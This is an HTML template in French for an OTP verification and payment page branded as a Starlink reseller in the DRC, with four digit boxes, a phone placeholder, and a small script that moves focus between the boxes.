<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification OTP - STARLINK RDC</title>
</head>
<body>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, Helvetica, sans-serif;
    }

    body {
        background: #f8f9fa;
        color: #333;
        min-height: 100vh;
    }

    /* Black Navbar */
    .navbar {
        background: #000;
        padding: 14px 0;
        position: sticky;
        top: 0;
        z-index: 1000;
    }

    .nav-container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 0 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        color: white;
    }

    .nav-logo {
        font-size: 1.5rem;
        font-weight: bold;
    }

    .nav-subtitle {
        font-size: 0.9rem;
        color: #aaa;
        margin-left: 8px;
    }

    .nav-links a {
        color: white;
        text-decoration: none;
        margin-left: 30px;
        font-size: 0.95rem;
    }

    .nav-links a:hover {
        color: #00aaff;
    }

    /* Main container */
    .otp-container {
        max-width: 480px;
        margin: 40px auto;
        padding: 0 16px;
    }

    .otp-card {
        background: white;
        border-radius: 16px;
        overflow: hidden;
        box-shadow: 0 10px 35px rgba(0,0,0,0.15);
    }

    /* Red Header */
    .otp-header {
        background: #d32f2f;
        color: white;
        padding: 50px 20px 30px;
        text-align: center;
    }

    .placeholder-square {
        width: 90px;
        height: 90px;
        background: white;
        margin: 0 auto 20px;
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 2.5rem;
        font-weight: bold;
        color: #d32f2f;
    }

    .otp-header h2 {
        font-size: 1.9rem;
        margin: 0;
    }

    /* Content */
    .otp-content {
        padding: 40px 24px 30px;
        text-align: center;
    }

    .shield-icon {
        width: 80px;
        height: 80px;
        background: #e8f5e9;
        color: #4caf50;
        font-size: 48px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 24px;
        border: 4px solid #4caf50;
    }

    .otp-title {
        font-size: 1.6rem;
        margin-bottom: 12px;
        font-weight: bold;
    }

    .otp-subtitle {
        font-size: 1.05rem;
        color: #555;
        margin-bottom: 32px;
    }

    .phone-display {
        font-size: 1.4rem;
        color: #d32f2f;
        font-weight: bold;
        margin-bottom: 32px;
    }

    /* OTP Boxes */
    .otp-inputs {
        display: flex;
        justify-content: center;
        gap: 16px;
        margin-bottom: 40px;
    }

    .otp-box {
        width: 60px;
        height: 70px;
        border: 3px solid #d32f2f;
        border-radius: 12px;
        font-size: 2.2rem;
        text-align: center;
        line-height: 64px;
        color: #333;
        background: white;
        transition: all 0.2s;
        outline: none;
    }

    .otp-box:focus {
        border-color: #b71c1c;
        box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.2);
    }

    /* Button */
    .btn-verify {
        width: 100%;
        padding: 18px;
        background: #d32f2f;
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 1.2rem;
        font-weight: 600;
        cursor: pointer;
        transition: background 0.3s;
    }

    .btn-verify:hover {
        background: #b71c1c;
    }

    /* Responsive */
    @media (max-width: 480px) {
        .otp-header {
            padding: 40px 16px 24px;
        }
        .otp-header h2 {
            font-size: 1.7rem;
        }
        .otp-box {
            width: 50px;
            height: 60px;
            font-size: 1.9rem;
            line-height: 54px;
        }
        .otp-inputs {
            gap: 12px;
        }
    }
</style>

    <!-- Black Navbar -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-logo">
                <span>STARLINK</span>
                <span class="nav-subtitle">Revendeur RDC</span>
            </div>
            <div class="nav-links">
                <a href="#">Statut</a>
                <a href="#">Forfaits</a>
                <a href="#">Commandes</a>
            </div>
        </div>
    </nav>

    <div class="otp-container">
        <div class="otp-card">

            <!-- Red Header -->
            <div class="otp-header">
                <div class="placeholder-square">□</div>
                <h2>Vérification Requise</h2>
            </div>

            <!-- OTP Content -->
            <div class="otp-content">
                <div class="shield-icon">✓</div>

                <h3 class="otp-title">Entrez le code OTP</h3>

                <p class="otp-subtitle">
                    Un code à 4 chiffres a été envoyé au<br>
                    <span class="phone-display">{{ phone }}</span>
                </p>

                <!-- 4 OTP Boxes -->
                <div class="otp-inputs">
                    <input type="text" class="otp-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
                    <input type="text" class="otp-box" maxlength="1" pattern="\d" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" pattern="\d" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" pattern="\d" inputmode="numeric">
                </div>

                <button class="btn-verify">VÉRIFIER ET PAYER</button>
            </div>

        </div>
    </div>

    <!-- Optional: Simple JS to move focus between boxes -->
    <script>
        const inputs = document.querySelectorAll('.otp-box');
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    </script>

</body>
</html>
